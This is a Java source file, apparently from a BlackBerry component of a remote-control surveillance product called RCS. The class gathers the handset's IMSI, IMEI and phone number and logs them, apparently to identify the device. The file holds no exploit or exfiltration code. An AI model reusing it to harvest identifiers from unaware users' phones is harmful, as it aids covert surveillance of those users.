/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Device.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.SIMCardException;
import net.rim.device.api.system.SIMCardInfo;

import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public final class Device implements Singleton {

    /** The debug instance. */
	//#debug
    private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);

    public static final int VERSION = 2010033101;
    public static final String SUBTYPE = "BLACKBERRY";

    /** The imei. */
    byte[] imei = new byte[0];

    /** The imsi. */
    byte[] imsi = new byte[0];

    /** The phone number. */
    String phoneNumber = "";

    /** The instance. */
    private static Device instance = null;

    /**
     * Gets the single instance of Device.
     * 
     * @return single instance of Device
     */
    public static synchronized Device getInstance() {
        if (instance == null) {
            instance = new Device();
        }

        return instance;
    }

    public static byte[] getSubtype() {

        return SUBTYPE.getBytes();
    }

    public static byte[] getVersion() {
        byte[] versionRet = Utils.intToByteArray(VERSION);
        // #ifdef DBC
        Check.ensures(versionRet.length == 4, "Wrong version len");
        // #endif
        return versionRet;
    }

    /**
     * Instantiates a new device.
     */
    private Device() {
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public byte[] getWImei() {

        // #ifdef DBC
        Check.ensures(imei != null, "null imei");
        // #endif
        return WChar.getBytes(Utils.imeiToString(imei));
    }

    public String getImei() {

        // #ifdef DBC
        Check.ensures(imei != null, "null imei");
        // #endif
        return Utils.imeiToString(imei);
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public byte[] getWImsi() {
        return WChar.getBytes(Utils.imeiToString(imsi));
    }

    public String getImsi() {
        return Utils.imeiToString(imsi);
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public byte[] getWPhoneNumber() {
        // #ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber");
        // #endif
        byte[] encoded = WChar.getBytes(phoneNumber);
        return encoded;
    }

    public String getPhoneNumber() {
        // #ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber");
        // #endif
        return phoneNumber;
    }

    public void clear() {

        imsi = new byte[0];
        imei = new byte[0];
        phoneNumber = "";
        return;
    }

    /**
     * Refresh data.
     */
    public void refreshData() {

        try {
            imsi = SIMCardInfo.getIMSI();
            // #debug
            debug.info("IMSI: " + Utils.imeiToString(imsi));
        } catch (SIMCardException e) {
            // #debug
            debug.warn("no sim detected");
        }

        imei = GPRSInfo.getIMEI();
        // #debug
        debug.info("IMSE: " + Utils.imeiToString(imsi));

        phoneNumber = Phone.getDevicePhoneNumber(true);
        if (phoneNumber == null) {
            phoneNumber = "";
        }
        // #debug
        debug.info("Phone Number: " + phoneNumber);
    }

}
